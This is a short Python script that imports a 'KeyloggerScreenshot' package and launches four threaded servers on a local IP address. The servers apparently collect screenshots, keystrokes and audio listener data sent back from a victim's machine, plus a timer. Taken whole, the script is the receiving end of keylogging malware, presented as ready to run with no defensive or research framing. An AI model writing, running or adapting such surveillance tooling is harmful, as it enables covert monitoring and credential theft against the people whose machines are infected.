
import KeyloggerScreenshot as ks 
import threading

server_photos = ks.ServerPhotos("192.168.0.75", 1111)

server_keylogger = ks.ServerKeylogger("192.168.0.75", 2222)

server_listener = ks.ServerListener("192.168.0.75", 3333)

server_time = ks.Timer("192.168.0.75", 4444)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start() 